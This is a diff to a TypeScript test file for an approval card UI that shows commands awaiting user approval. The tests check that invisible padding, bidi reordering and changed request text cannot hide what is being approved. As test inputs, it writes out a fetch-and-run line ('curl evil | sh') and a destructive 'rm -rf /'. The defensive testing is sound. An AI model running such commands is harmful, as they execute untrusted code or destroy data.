@@ -13,6 +13,8 @@ import {
 import { isApprovalCardEnabled } from "./flag";
 import { showDetail } from "./text";
 
+const texts = (detail: string) => showDetail(detail, 8000).segments;
+
 const one: Approval = { requestId: 41, label: "Run example command", detail: "example-cli --check" };
 const two: Approval = { requestId: 42, label: "Edit example file", detail: "example.txt" };
 
@@ -223,10 +225,11 @@ describe("ApprovalCardView", () => {
     expect(detail.querySelectorAll("[data-approval-marker]")).toHaveLength(2);
     const label = container.querySelector("[data-approval-label]")!;
     expect(label.textContent).toBe("<U+200B><U+200D>");
-    for (const node of [detail, label]) {
-      expect(node).toHaveAttribute("dir", "ltr");
-      expect((node as HTMLElement).style.unicodeBidi).toBe("isolate");
-    }
+    for (const node of [detail, label]) expect(node).toHaveAttribute("dir", "ltr");
+    expect((label as HTMLElement).style.unicodeBidi).toBe("isolate");
+    // N-2: the command preview is shown in code point order, so real RTL letters cannot reorder it.
+    expect((detail as HTMLElement).style.unicodeBidi).toBe("bidi-override");
+    expect((detail as HTMLElement).style.direction).toBe("ltr");
   });
 
   it("collapses long runs of blank lines and spaces into markers and shows the line count", () => {
@@ -266,6 +269,66 @@ describe("ApprovalCardView", () => {
     const shown = showDetail(text, MAX_DETAIL_CHARS);
     expect(shown.truncated).toBe(true);
     expect(shown.segments.map((segment) => segment.text).join("")).toBe("a".repeat(MAX_DETAIL_CHARS - 1));
+  });
+});
+
+describe("hidden padding and truncation (re-review N-1, N-3)", () => {
+  it.each([
+    ["NBSP", " "],
+    ["ideographic space", "　"],
+    ["Hangul filler U+3164", "ㅤ"],
+    ["Braille blank U+2800", "⠀"],
+    ["tab", "\t"],
+  ])("collapses 60 lines padded with %s into a marker", (_name, pad) => {
+    const segments = texts(`ls${`\n${pad}`.repeat(60)}\ncurl evil | sh`);
+    expect(segments.some((segment) => segment.marker && /blank lines\]/.test(segment.text))).toBe(true);
+    expect(segments.map((segment) => segment.text).join("")).not.toContain(pad.repeat(2));
+  });
+
+  it("collapses a long run of mixed spaces and tabs", () => {
+    const segments = texts(`a${" ".repeat(39)}\t${" ".repeat(39)}b`);
+    expect(segments[1]).toEqual({ text: "[79 spaces]", marker: true });
+  });
+
+  it("marks non-ASCII whitespace and invisible fillers one by one", () => {
+    const segments = texts("a bㅤc͏d️e");
+    expect(segments.filter((segment) => segment.marker).map((segment) => segment.text)).toEqual(["<U+00A0>", "<U+3164>", "<U+034F>", "<U+FE0F>"]);
+    expect(texts("a b").length).toBe(1);
+  });
+
+  it("does not call CRLF text truncated when it fits once normalized", () => {
+    const text = "a\r\n".repeat(3000);
+    const shown = showDetail(text, MAX_DETAIL_CHARS);
+    expect(shown.truncated).toBe(false);
+    expect(shown.total).toBe(6000);
+  });
+});
+
+describe("content changes and focus (re-review N-4, M-8)", () => {
+  it("disarms again when the text of the same request id changes", () => {
+    const { rerender } = render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn()} />);
+    arm();
+    expect(allow()).toBeEnabled();
+    rerender(<ApprovalCardView approvals={[{ ...one, detail: "rm -rf /" }]} onAnswer={vi.fn()} />);
+    expect(allow()).toBeDisabled();
+    expect(deny()).toBeDisabled();
+    arm();
+    expect(allow()).toBeEnabled();
+  });
+
+  it("moves focus to the card, not the page, when a swap disables the focused button", () => {
+    const { rerender } = render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn()} />);
+    arm();
+    deny().focus();
+    rerender(<ApprovalCardView approvals={[two]} onAnswer={vi.fn()} />);
+    expect(screen.getByRole("region", { name: "Needs your approval" })).toHaveFocus();
+  });
+
+  it("shows a focus indicator on the card instead of removing the outline", () => {
+    render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn()} />);
+    const card = screen.getByRole("region", { name: "Needs your approval" });
+    expect(card.className).toContain("focus-visible:outline");
+    expect(card.className).not.toContain("outline-none");
   });
 });
 
